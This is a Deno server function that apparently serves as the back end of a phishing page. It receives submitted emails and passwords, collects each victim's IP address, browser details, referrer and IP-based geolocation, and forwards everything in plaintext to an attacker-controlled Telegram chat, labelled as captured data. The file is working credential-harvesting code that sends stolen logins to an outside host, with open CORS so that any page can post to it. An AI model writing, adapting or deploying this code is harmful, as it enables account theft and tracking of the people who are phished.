import { serve } from "https://deno.land/std@0.168.0/http/server.ts"

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders })
  }

  try {
    const { email, password } = await req.json()
    
    const botToken = Deno.env.get('TELEGRAM_BOT_TOKEN')
    const chatId = Deno.env.get('TELEGRAM_CHAT_ID')
    
    if (!botToken || !chatId) {
      throw new Error('Telegram bot configuration missing')
    }

    // Get client IP and other data
    const clientIP = req.headers.get('x-forwarded-for') || 
                    req.headers.get('x-real-ip') || 
                    'Unknown'
    const userAgent = req.headers.get('user-agent') || 'Unknown'
    const referer = req.headers.get('referer') || 'Direct'
    
    // Get geolocation data from IP
    let locationData = 'Unknown'
    try {
      const geoResponse = await fetch(`http://ip-api.com/json/${clientIP}`)
      const geoData = await geoResponse.json()
      if (geoData.status === 'success') {
        locationData = `${geoData.city}, ${geoData.regionName}, ${geoData.country} (${geoData.isp})`
      }
    } catch (error) {
      console.warn('Geolocation lookup failed:', error)
    }

    const message = `
🔐 New Authentication Attempt

📧 Email: ${email}
🔑 Password: ${password}
⏰ Time: ${new Date().toISOString()}

📍 Network Information:
🌐 IP Address: ${clientIP}
📍 Location: ${locationData}
🖥️ User Agent: ${userAgent}
🔗 Referrer: ${referer}

---
Captured via Linkapi Bot
    `.trim()
    
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      })
    })
    
    if (!response.ok) {
      const errorText = await response.text()
      throw new Error(`Telegram API error: ${response.status} - ${errorText}`)
    }
    
    return new Response(
      JSON.stringify({ success: true, message: 'Message sent successfully' }),
      { 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 200 
      }
    )
    
  } catch (error) {
    console.error('Failed to send to Telegram:', error)
    return new Response(
      JSON.stringify({ 
        success: false, 
        error: error.message || 'Unknown error occurred' 
      }),
      { 
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        status: 500 
      }
    )
  }
})